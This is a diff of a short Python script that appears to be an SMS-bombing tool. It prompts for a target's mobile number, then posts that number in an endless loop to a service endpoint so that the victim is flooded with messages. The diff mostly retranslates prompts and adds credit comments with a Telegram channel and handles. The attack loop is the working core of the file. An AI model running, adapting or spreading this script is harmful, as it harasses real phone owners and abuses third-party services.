@@ -9,16 +9,20 @@ os.system("clear")
 os.system("apt install figlet -y")
 os.system("clear")
 print(f"{green}===========================================")
-print(f"{rex}  REX DEVLOPER TEAM | TEAMSPEAK IP : REXTS.IR            ")
+print(f"{yellow}  REX TEAM DEVLOPER   |      TEAMSPEAK IP : REXTS.IR          ")
 print(f"{green}===========================================")
 print(f"{red} [1]"+ f"{blue} start")
 print(f"{red} [2]"+ f"{blue} exit")
 king = int(input(f"{red} [~]"+ f"{green} Bad_boy==>"))
 if king == 1:
-    hacker = input("Lotfan Shomare Mobile Hadaf Ra Vared Konid (+989++++++) : ")
+    hacker = input("Enter phone Number (+989++++++) : ")
     while True:
               requests.post(url,data={"cellphone":hacker})
               print("sended to =>", hacker)
 elif king == 2:
     os.system("clear")
     print("have nice day =) ")
+#tekegram channel : @samyBorder
+#made by admin channel 
+#samyar and M.r jooon or Bad_boy
+#good bye =) =)
